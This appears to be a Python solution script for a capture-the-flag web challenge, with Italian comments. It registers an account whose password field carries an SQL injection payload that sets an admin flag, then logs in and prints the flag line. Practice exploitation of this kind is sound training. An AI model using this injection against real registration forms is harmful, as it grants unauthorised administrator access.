import requests

url_reg = 'http://adminsecret.challs.olicyber.it/register.php'
url_log = 'http://adminsecret.challs.olicyber.it/login.php'

reg_paylaod = {'username':'unbelnomecomplicatissimo', 'password':"unabellapassword',true);-- -"} #grazie all'exploit isadmin=true
r = requests.post(url_reg , data=reg_paylaod)

print(r.text) #debug alternativo allo status code

log_payload = {'username':'unbelnomecomplicatissimo', 'password':'unabellapassword'}
r = requests.post(url_log, data=log_payload).text

for i in r.splitlines():
    if "flag{" in i.lower():
        print(i) 


